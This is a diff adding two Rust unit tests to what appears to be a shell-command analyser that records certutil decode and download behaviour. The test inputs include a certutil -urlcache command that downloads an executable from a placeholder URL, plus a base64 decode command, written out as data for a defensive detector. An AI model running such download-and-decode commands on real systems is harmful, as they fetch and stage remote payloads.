@@ -7492,6 +7492,38 @@ mod certutil_tests {
     }
 
     #[test]
+    fn certutil_decode_skips_slash_force_flag() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "src.b64".to_string(),
+            FsEntry::Content {
+                content: b64("hello").into_bytes(),
+                append: false,
+            },
+        );
+
+        interpret_line("certutil -decode /f src.b64 dst.bin", &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDecode { src, dst, src_resolved }
+                    if src == "src.b64" && dst == "dst.bin" && *src_resolved
+            )),
+            "certutil -decode /f paths were not parsed: {:?}",
+            env.traits
+        );
+        assert!(
+            matches!(
+                env.modified_filesystem.get("dst.bin"),
+                Some(FsEntry::Decoded { content, .. }) if content == b"hello"
+            ),
+            "dst.bin was not decoded: {:?}",
+            env.modified_filesystem.get("dst.bin")
+        );
+    }
+
+    #[test]
     fn certutil_decodehex_accepts_offset_dump_rows() {
         let mut env = Environment::new(&Config::default());
         env.modified_filesystem.insert(
@@ -7740,6 +7772,22 @@ mod certutil_tests {
             )
         });
         assert!(has, "no liberal CertutilDownload trait: {:?}", env.traits);
+    }
+
+    #[test]
+    fn certutil_urlcache_skips_slash_flag_after_url() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line("certutil -urlcache http://x/y.exe /f out.exe", &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst } if url == "http://x/y.exe" && dst == "out.exe"
+            )
+        });
+        assert!(
+            has,
+            "certutil -urlcache slash flag was parsed as destination: {:?}",
+            env.traits
+        );
     }
 
     #[test]
